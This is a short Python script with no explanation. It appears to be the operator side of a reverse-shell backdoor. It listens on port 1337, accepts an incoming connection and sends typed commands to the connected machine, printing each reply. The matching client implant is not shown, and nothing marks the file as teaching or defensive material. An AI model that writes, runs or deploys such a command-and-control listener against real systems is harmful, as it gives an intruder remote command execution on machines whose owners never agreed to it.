import socket
import sys


def socket_create():
    try:
        global host
        global port
        global s
        host = ''
        port = 1337
        s = socket.socket()
    except socket.error as msg:
        print("Socket Creation Error: " + str(msg))


def socket_bind():
    try:
        global host
        global port
        global s
        print("Binding Socket To Port " + str(port))
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print('Socket Binding Error: ' + str(msg) + '\n' + 'Retrying...')
        socket_bind()


def socket_accept():
    conn, address = s.accept()
    print("Connection As Benn Established | " + "IP " + address[0] + " | Port " + str(address[1]))
    send_command(conn)
    conn.close()


def send_command(conn):
    while True:
        cmd = input()
        if cmd == "exit":
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "utf-8")
            print(client_response, end="")


def main():
    socket_create()
    socket_bind()
    socket_accept()


main()
